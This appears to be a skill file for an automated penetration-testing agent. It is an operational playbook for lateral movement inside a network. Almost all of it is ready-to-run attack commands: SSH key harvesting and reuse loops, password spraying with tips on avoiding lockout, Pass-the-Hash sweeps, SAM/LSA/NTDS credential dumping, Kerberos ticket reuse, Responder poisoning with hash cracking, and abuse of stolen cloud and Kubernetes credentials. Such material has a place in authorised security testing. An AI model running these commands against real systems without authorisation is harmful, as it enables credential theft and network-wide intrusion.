---
name: lateral_movement
description: Internal lateral movement — SSH key reuse, password spraying, Pass-the-Hash, Kerberos ticket attacks (PtT/overpass-the-hash), remote execution (NetExec/Impacket/WinRM), poisoning (responder), cloud credential abuse. Includes decision matrix for tool selection.
---

# Lateral Movement

## Decision Matrix

| You have... | Best tool | Command example |
|---|---|---|
| Password + SMB access | NetExec | `nxc smb <ip> -u user -p pass` |
| Password + WinRM | evil-winrm | `evil-winrm -i <ip> -u user -p pass` |
| NTLM hash | Impacket | `impacket-psexec -hashes :NTLM <user>@<ip>` |
| NTLM hash (sweep) | NetExec | `nxc smb <cidr> -u user -H hash` |
| SSH key | SSH | `ssh -i key user@<ip>` |
| Kerberos ticket | Impacket/Rubeus | `export KRB5CCNAME=... && impacket-wmiexec` |
| Password spray target | nxc / kerbrute | `nxc smb <range> -u users.txt -p 'Company2026!'` |

## SSH Key Reuse

```bash
# Collect SSH keys from compromised hosts
find / -name "authorized_keys" -type f 2>/dev/null
find / -name "id_*" -type f ! -name "*.pub" 2>/dev/null

# Check known_hosts to map infrastructure
cat ~/.ssh/known_hosts

# Try each key against other discovered hosts
for host in $(cat /tmp/internal_hosts.txt); do
    for key in ~/.ssh/id_*; do
        ssh -i "$key" -o BatchMode=yes -o ConnectTimeout=3 user@$host "id" 2>/dev/null && echo "SUCCESS: $key → $host"
    done
done
```

## Password Spraying

**Avoid account lockout**: spray ONE password per user per attempt window. Time gaps ≥ 30 min for AD lockout policies.

```bash
# NetExec password spray against SMB
nxc smb 10.0.0.0/24 -u users.txt -p 'Spring2026!' --continue-on-success

# Kerbrute (pre-auth, no lockout on most configs)
kerbrute passwordspray -d corp.local --dc 10.0.0.1 users.txt 'Spring2026!'

# Test common service passwords
nxc mssql 10.0.0.0/24 -u sa -p '' --local-auth
nxc redis 10.0.0.0/24 --password ''
nxc ssh 10.0.0.0/24 -u root -p root --continue-on-success
```

## Remote Execution (Windows)

### NetExec (Swiss Army Knife)

```bash
# SMB — command execution
nxc smb 10.0.0.10 -u user -p pass -x "whoami"

# Dump SAM (local accounts)
nxc smb 10.0.0.10 -u user -p pass --sam

# Dump LSA secrets
nxc smb 10.0.0.10 -u user -p pass --lsa

# Dump LSASS (hashes!)
nxc smb 10.0.0.10 -u user -p pass --ntds

# Pass-the-Hash sweep entire subnet
nxc smb 10.0.0.0/24 -u administrator -H <ntlm_hash> --local-auth

# WinRM command execution
nxc winrm 10.0.0.10 -u user -p pass -x "whoami"

# MSSQL command execution
nxc mssql 10.0.0.10 -u sa -p pass -x "whoami" --local-auth
```

### Impacket Tools

```bash
# PsExec (SYSTEM shell, creates service)
impacket-psexec corp.local/user:pass@10.0.0.10

# Pass-the-Hash PsExec
impacket-psexec -hashes :<NTLM_HASH> corp.local/administrator@10.0.0.10

# WMI execution (stealthier, no service created)
impacket-wmiexec corp.local/user:pass@10.0.0.10
impacket-wmiexec -hashes :<NTLM> corp.local/admin@10.0.0.10

# SMB execution (creates share)
impacket-smbexec corp.local/user:pass@10.0.0.10

# AT scheduler execution
impacket-atexec corp.local/user:pass@10.0.0.10 "whoami"

# DCOM execution (no service, stealthy)
impacket-dcomexec corp.local/user:pass@10.0.0.10
```

### Evil-WinRM (Interactive Shell)

```bash
# Password auth
evil-winrm -i 10.0.0.10 -u user -p pass

# Pass-the-Hash
evil-winrm -i 10.0.0.10 -u user -H <NTLM_HASH>

# With SSL
evil-winrm -i 10.0.0.10 -u user -p pass -S

# Upload/download files
upload /tmp/exploit.exe
download C:\temp\data.txt /workspace/output/
```

## Kerberos Ticket Attacks

Use when you hold a password, NTLM hash, or AES key for a domain account —
request and reuse tickets instead of replaying the raw secret:

```bash
# Request a TGT with a password (or -hashes :NTLM / -aesKey KEY)
impacket-getTGT corp.local/user:password
export KRB5CCNAME=user.ccache

# Overpass-the-hash: TGT from an NTLM hash, then authenticate with the ticket
impacket-getTGT -dc-ip 10.0.0.1 -hashes :<NTLM> corp.local/user

# Use the ticket for remote execution (no password sent to the target)
export KRB5CCNAME=/workspace/output/user.ccache && impacket-wmiexec -k -no-pass corp.local/user@ws01.corp.local
klist  # verify which tickets you hold and their expiry

# Convert between Windows .kirbi and Unix .ccache when moving between tools
impacket-ticketConverter ticket.kirbi ticket.ccache

# Renewal: tickets expire; re-request from the hash rather than saving the
# TGT indefinitely (10-year golden-style tickets stand out — keep lifetimes short)
```

Kerberos flows need name resolution and time sync with the DC (`ntpdate`,
`/etc/krb5.conf` or `-dc-ip`). For certificate-based access (ADCS), shadow
credentials and delegation abuse, see `technologies/active_directory`; for
relay and coercion see `internal/relay_and_coercion`.

## Name Resolution Poisoning (Responder)

Use when you have a foothold on the same L2 segment as other Windows hosts
(relay instead of crack: `internal/relay_and_coercion`):

```bash
# Start responder (captures NTLMv2 hashes)
sudo responder -I <interface> -dwv

# With specific analysis modes
sudo responder -I eth0 -A   # passive (no poison, just listen)

# After capturing hashes → crack offline with john/hashcat
# Save capture to /workspace/output/responder/
```

## LLMNR/NBT-NS/MDNS Poisoning Workflow

```bash
# 1. Start responder on the foothold
sudo responder -I eth0 -dwv 2>&1 | tee /workspace/output/responder_session.log

# 2. Wait for NTLMv2 captures
# 3. Crack captured hashes
john --wordlist=/usr/share/wordlists/rockyou.txt /workspace/output/hashes.txt
hashcat -m 5600 /workspace/output/hashes.txt /usr/share/wordlists/rockyou.txt

# 4. Use cracked credentials for lateral movement
nxc smb 10.0.0.0/24 -u cracked_user -p cracked_pass
```

## Database Lateral Movement

```bash
# MySQL — enumerate and execute
mysql -h 10.0.0.60 -u root -p'password' -e "SHOW DATABASES;"
mysql -h 10.0.0.60 -u root -p'password' -e "SELECT User,Host FROM mysql.user;"

# MSSQL via NetExec
nxc mssql 10.0.0.10 -u sa -p pass --local-auth -x "whoami"

# MSSQL via Impacket
impacket-mssqlclient corp.local/user:pass@10.0.0.10

# Redis (unauthenticated)
redis-cli -h 10.0.0.52 INFO
redis-cli -h 10.0.0.52 KEYS '*'

# PostgreSQL
psql -h 10.0.0.10 -U postgres -c '\l'
```

## Cloud Credential Lateral Movement

Found AWS/GCP/Azure credentials on a host?

```bash
# AWS — check what the credentials can access
export AWS_ACCESS_KEY_ID=<key>
export AWS_SECRET_ACCESS_KEY=<secret>
aws sts get-caller-identity
aws s3 ls
aws ec2 describe-instances --region us-east-1

# GCP
gcloud auth activate-service-account --key-file=<file>
gcloud projects list
gcloud storage ls

# Azure
az login --service-principal -u <id> -p <secret> --tenant <tenant>
az account list
az vm list
```

## Kubernetes Lateral Movement

```bash
# If you have a service account token
kubectl --token=<token> --server=https://<api-server> get pods -A

# Check RBAC permissions
kubectl --token=<token> auth can-i --list

# If kubeconfig is available
export KUBECONFIG=/path/to/.kube/config
kubectl get nodes
kubectl get secrets -A
```
